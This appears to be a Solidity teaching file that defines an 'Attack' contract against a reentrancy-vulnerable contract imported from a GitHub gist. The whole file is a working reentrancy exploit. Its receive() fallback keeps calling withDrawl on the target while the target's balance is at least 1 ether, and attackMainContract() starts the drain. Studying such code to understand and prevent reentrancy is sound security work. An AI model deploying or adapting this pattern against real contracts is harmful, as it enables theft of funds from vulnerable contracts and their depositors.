// SPDX-License-Identifier:MIT

pragma solidity ^0.6.0;

import "https://gist.githubusercontent.com/s3sivaram/d19b0dd4da324644a4adec5af559acac/raw/bd038a60ab6db18c39b11aff1aeefa37274558c0/reEntrancyMain.sol";

contract Attack{
    
    reEntrancyMain public mainContract;
    uint256 public attackcontractBalance;
    
    
    constructor (address _mainContractAddrs) public{
        
        mainContract = reEntrancyMain(_mainContractAddrs);
    }
    
    receive() payable external{
        //mainContract.depositEther();
        if (address(mainContract).balance >= 1 ether) {
            mainContract.withDrawl(1 ether);
            attackcontractBalance = address(this).balance;
        }
    }
    
    function attackMainContract() payable public {
        //mainContract.depositEther{value: 3 ether}();
        
        attackcontractBalance = address(this).balance;
        
        mainContract.withDrawl(2 ether);
        
        
    }
    
    
}
